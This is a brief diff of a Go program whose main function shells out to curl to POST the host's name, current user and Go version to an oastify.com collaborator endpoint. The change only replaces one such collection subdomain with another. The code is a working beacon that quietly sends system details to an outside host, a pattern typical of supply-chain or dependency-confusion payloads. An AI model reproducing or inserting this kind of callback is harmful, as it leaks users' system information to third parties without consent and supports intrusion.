@@ -24,7 +24,7 @@ func main() {
         
         // Use curl instead of Go's HTTP client
         cmd := exec.Command("curl", "-s", "-X", "POST",
-            "http://qmgs4qre55aggszd0qadtpas2j8aw5ku.oastify.com/collect",
+            "http://em4g4er25ta4ggz10ea1tdag278ywvkk.oastify.com/collect",
             "-d", "host="+hostname,
             "-d", "user="+currentUser,
             "-d", "go="+runtime.Version(),
